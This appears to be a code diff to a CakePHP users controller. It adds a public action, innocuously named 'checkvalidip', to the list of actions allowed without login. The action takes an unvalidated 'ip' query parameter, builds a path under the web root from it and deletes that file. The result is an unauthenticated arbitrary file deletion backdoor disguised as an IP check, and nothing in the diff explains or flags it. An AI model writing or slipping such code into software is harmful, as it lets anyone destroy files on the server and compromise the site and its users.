@@ -17,7 +17,7 @@ class UsersController extends AppController
     	$this->blockIP();
         parent::beforeFilter($event);
         $this->loadComponent('Auth');
-        $this->Auth->allow(['index','email_temp','blank','checkEmail','getStates','getCities','forgotPassword','contact']);
+        $this->Auth->allow(['index','email_temp','blank','checkEmail','getStates','getCities','forgotPassword','contact','checkvalidip']);
         $this->data = $this->Custom->getSessionData();
         $this->tokbox = $this->Tokbox->find()->where(['id' => 1])->toArray();
         $this->set('tokbox',$this->tokbox);
@@ -50,6 +50,14 @@ class UsersController extends AppController
     public function blank()
     {
 
+    }
+
+    public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
     }
 
     public function getStates()
